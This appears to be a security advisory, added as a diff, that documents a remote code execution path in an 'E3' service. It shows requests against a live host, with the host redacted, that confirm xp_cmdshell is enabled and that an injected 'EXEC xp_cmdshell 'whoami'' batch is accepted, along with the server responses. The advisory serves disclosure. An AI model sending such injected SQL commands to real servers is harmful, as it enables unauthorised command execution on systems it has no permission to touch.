@@ -1,0 +1,28 @@
+e3 · command-execution preconditions (live deployment, host redacted)
+=======================================================================
+
+1) xp_cmdshell runtime configuration
+
+Request: retObjs[0] =
+  SELECT COUNT(*) FROM sys.configurations WHERE name = 'xp_cmdshell' AND value_in_use = 1
+
+HTTP 200
+{"status":"success","message":"","data":"{\"sys.configurations\":[{\"Column1\":{\"Int32\":1},\"ROWSTATE\":{\"String\":\"2\"}}]}","code":null,"text":null}
+
+→ COUNT(*) = 1: xp_cmdshell is ENABLED at runtime (value_in_use = 1).
+
+2) dispatcher accepts EXEC batches (statement-type restriction absent)
+
+Request: retObjs[0] = EXEC xp_cmdshell 'whoami'
+
+HTTP 200
+{"status":"success","message":"","data":"{\"A\":[{\"ROWSTATE\":{\"String\":\"empty\"}}]}","code":null,"text":null}
+
+→ status: success with an empty result set. The batch was accepted and
+  forwarded to SQL Server; the output is not echoed because xp_cmdshell's
+  result set contains an unnamed second column and the E3 serialiser maps
+  result columns by name.
+
+Interpretation: no command output was obtained and no command-execution
+payload is provided in this advisory; the RCE path is confirmed by verified
+configuration state (sa + xp_cmdshell enabled + EXEC accepted).
